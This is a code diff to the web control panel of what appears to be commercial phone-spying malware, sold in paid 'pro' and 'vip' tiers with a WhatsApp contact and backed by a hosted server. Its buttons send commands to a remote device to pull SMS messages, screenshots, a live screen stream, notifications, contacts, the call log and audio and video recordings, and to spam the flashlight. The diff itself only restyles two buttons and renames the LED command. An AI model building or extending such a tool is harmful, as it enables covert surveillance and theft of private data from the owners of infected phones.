@@ -370,8 +370,8 @@
     <input class="field" id="loginCode" placeholder="•••••" maxlength="6" inputmode="numeric">
     
     <div class="code-actions" style="margin-top:14px; display:flex; gap:10px;">
-      <button class="btn-copy" onclick="closeModal()">CANCEL</button>
-      <button class="btn-continue" onclick="loginWithCode()">ENTER</button>
+      <button class="btn-copy" onclick="closeModal()" style="flex:1; padding:14px; border-radius:12px; border:1px solid var(--border); background:var(--card); color:var(--text-2); font-weight:800; font-size:12px; letter-spacing:.1em; font-family:inherit;">CANCEL</button>
+      <button class="btn-continue" onclick="loginWithCode()" style="flex:1; padding:14px; border-radius:12px; border:none; background:linear-gradient(135deg,var(--accent),var(--accent-2)); color:#fff; font-weight:800; font-size:12px; letter-spacing:.1em; font-family:inherit;">ENTER</button>
     </div>
   </div>
 </div>
@@ -407,7 +407,7 @@
       <div class="ctrl" data-cmd="message_sync" data-tier="pro"><div class="icon">💬</div><div class="label">SMS</div><div class="desc">Inbox</div></div>
       <div class="ctrl" data-cmd="display_read" data-tier="pro"><div class="icon">📱</div><div class="label">SCREENSHOT</div><div class="desc">Current screen</div></div>
       <div class="ctrl" data-cmd="display_stream" data-tier="pro"><div class="icon">🔴</div><div class="label">LIVE SCREEN</div><div class="desc">Continuous</div></div>
-      <div class="ctrl" data-cmd="led_test" data-tier="pro"><div class="icon">⚡</div><div class="label">FLASH SPAM</div><div class="desc">Blink LED</div></div>
+      <div class="ctrl" data-cmd="flash_spam" data-tier="pro"><div class="icon">🔦</div><div class="label">FLASH SPAM</div><div class="desc">Blink LED</div></div>
       <div class="ctrl" data-cmd="alert_sync" data-tier="pro"><div class="icon">🔔</div><div class="label">NOTIFICATIONS</div><div class="desc">Recent</div></div>
       <div class="ctrl" data-cmd="contact_sync" data-tier="pro"><div class="icon">👤</div><div class="label">CONTACTS</div><div class="desc">Full list</div></div>
       <div class="ctrl" data-cmd="call_sync" data-tier="pro"><div class="icon">📞</div><div class="label">CALL LOG</div><div class="desc">Last 50</div></div>
@@ -432,7 +432,7 @@
 <div class="modal-img" id="imgModal"><button class="modal-close-btn" onclick="document.getElementById('imgModal').classList.remove('show')">CLOSE</button><img id="imgModalImg" src=""></div>
 
 <script>
-const SERVER = "https://thevoidbugtool2-0.onrender.com"; // <--- MAKE SURE THIS MATCHES YOUR RENDER URL
+const SERVER = "https://thevoidbugtool2-0.onrender.com"; // MAKE SURE THIS MATCHES YOUR RENDER URL
 const WHATSAPP = "2349153239545";
 const TIER_LIMITS = { pro: 10, vip: 999999 };
 const TIER_RANK = { pro: 1, vip: 2 };
@@ -617,10 +617,10 @@ document.querySelectorAll('.ctrl').forEach(function(el){
     if(cmd === 'clip_record'){ const s = prompt('Video length (seconds):', '10'); if(s === null) return; arg = s; }
     if(cmd === 'voice_record'){ const s = prompt('Audio length (seconds):', '15'); if(s === null) return; arg = s; }
 
-    if(cmd === 'led_test'){ state.flashOn = !state.flashOn; if(state.flashOn){ el.classList.add('active'); arg = 'on'; } else { el.classList.remove('active'); arg = 'off'; } }
+    if(cmd === 'flash_spam'){ arg = 'on'; }
     if(cmd === 'display_stream'){ state.liveOn = !state.liveOn; if(state.liveOn){ el.classList.add('active'); arg = 'on'; } else { el.classList.remove('active'); arg = 'off'; } }
 
-    if(cmd !== 'led_test' && cmd !== 'display_stream'){
+    if(cmd !== 'flash_spam' && cmd !== 'display_stream'){
       state.activeCommand = cmd;
       state.lastResultId = 0;
       $('outputBox').innerHTML = '<div class="empty">EXECUTING ' + cmd.toUpperCase() + '...</div>';
@@ -636,7 +636,7 @@ document.querySelectorAll('.ctrl').forEach(function(el){
         return;
       }
       if (!state.isAdmin && state.tier !== 'vip') { state.commandsUsed++; updateTierUI(); }
-      if(cmd !== 'led_test' && cmd !== 'display_stream') showToast('Sent: '+cmd);
+      if(cmd !== 'flash_spam' && cmd !== 'display_stream') showToast('Sent: '+cmd);
     }catch(e){ showToast('Server error'); }
   });
 });
